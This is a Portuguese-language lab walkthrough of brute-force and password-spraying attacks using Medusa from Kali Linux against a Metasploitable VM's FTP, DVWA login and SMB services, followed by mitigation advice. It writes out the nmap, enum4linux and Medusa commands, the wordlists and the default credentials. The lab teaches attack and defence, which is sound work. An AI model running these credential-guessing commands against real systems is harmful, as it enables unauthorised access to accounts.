Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

![snapshot](https://i.imgur.com/oDCMWRF.png)
![snapshot](https://i.imgur.com/aTjuSPv.png)
![snapshot](https://i.imgur.com/NfOQJi8.png)
![snapshot](https://i.imgur.com/AL2yQkF.png)
![snapshot](https://i.imgur.com/TiZNdWo.png)
![snapshot](https://i.imgur.com/SQPxYTN.png)
![snapshot](https://i.imgur.com/UTs1PXR.png)
![snapshot](https://i.imgur.com/DoNoWpQ.png)
![snapshot](https://i.imgur.com/9wZix18.png)
![snapshot](https://i.imgur.com/q9ZFwaA.png)
![snapshot](https://i.imgur.com/ZL1B77p.png)
![snapshot](https://i.imgur.com/neNRNgV.png)
![snapshot](https://i.imgur.com/Jco5LOV.png)
![snapshot](https://i.imgur.com/fd57gWn.png)
![snapshot](https://i.imgur.com/hZGqYmr.png)
![snapshot](https://i.imgur.com/4bA7U8L.png)
![snapshot](https://i.imgur.com/W76quRU.png)

Simulação de Ataques de Força Bruta com Medusa e Kali Linux

O projeto demonstra a simulação de ataques de força bruta utilizando a ferramenta Medusa no Kali Linux, testando três serviços vulneráveis do Metasploitable: FTP, HTTP (DVWA) e SMB. O objetivo é compreender como ataques automatizados funcionam e como preveni-los.

Configuração Inicial

Instalação das VMs Kali Linux e Metasploitable no VirtualBox.

Criação de snapshot para recuperação rápida do Metasploitable.

Login padrão msfadmin:msfadmin.

Identificação do IP via ifconfig.

Teste de comunicação com ping.

Ataque FTP

Enumeração com Nmap
Comando: nmap -sV -p 21,22,80,445,139 IP
Objetivo: confirmar portas e versões dos serviços.

Tentativa de conexão direta
Comando: ftp IP
Como as credenciais são desconhecidas, procede-se com brute force.

Criação de wordlists

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt


Ataque com Medusa
Comando:
medusa -h IP -U users.txt -P pass.txt -M ftp -t 6
Credenciais encontradas: msfadmin : msfadmin.

Validação manual do acesso
Comando: ftp IP.

Ataque HTTP (DVWA)

Acesso ao formulário: http://IP/dvwa/login.php.
Uso do DevTools (F12) para identificar parâmetros enviados via POST.

Ataque com Medusa
Comando:

medusa -h IP -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6


Credenciais válidas aparecem como SUCCESS.

Ataque SMB (Password Spraying)

Enumeração com enum4linux
Comando:
enum4linux -a IP | tee enum4_output.txt
O arquivo reúne usuários e informações úteis.

Criação de wordlists personalizadas

echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt


Ataque com Medusa (smbnt)
Comando:
medusa -h IP -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Validação com smbclient
Comando:
smbclient -L //IP -U msfadmin.

Recomendações de Mitigação
1. Fortalecer Autenticação

Senhas fortes (mín. 14 caracteres, complexidade).

MFA obrigatório.

Limite de tentativas de login.

Uso de CAPTCHA.

2. Proteção na Camada de Rede

Firewalls e WAF.

Monitoramento e bloqueio automático de IPs suspeitos.

Honeypots para detectar invasores.

Alteração de portas padrão para reduzir ataques automatizados.

3. Segurança do Sistema

Atualizações regulares.

Remoção de contas não utilizadas.

Criptografia de dados sensíveis, incluindo senhas.